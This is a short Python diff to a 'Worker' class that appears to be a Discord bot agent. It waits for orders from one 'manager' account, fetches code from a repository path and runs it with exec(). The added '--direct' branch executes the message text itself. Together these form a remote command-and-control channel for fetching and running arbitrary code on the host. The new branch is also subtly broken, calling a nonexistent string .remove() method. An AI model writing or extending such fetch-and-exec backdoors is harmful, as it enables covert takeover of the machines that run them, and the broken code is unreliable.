@@ -36,12 +36,20 @@ class Worker:
     await self.bot.wait_until_ready()
     order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
     order = order.content
-    user, repo, path = order.split(":")[0], order.split(":")[1], order.split(":")[2]
-    page = git(author=user, repo=repo, path=path, mode=1)
-    print(page)
+    if not "--direct" in order:
+      user, repo, path = order.split(":")[0], order.split(":")[1], order.split(":")[2]
+      page = git(author=user, repo=repo, path=path, mode=1)
+    
 
-    try:
-      exec(str(page))
-    except Exception as e:
-      print("Error in exec, hear(): " + str(e))
-      print(str(page))
+      try:
+        exec(str(page))
+      except Exception as e:
+        print("Error in exec, hear(): " + str(e))
+        print(str(page))
+        
+    else:
+      try:
+        exec(order.remove("--direct"))
+      except Exception as e:
+        print("Error in executing direct order, hear():" + str(e))
+      
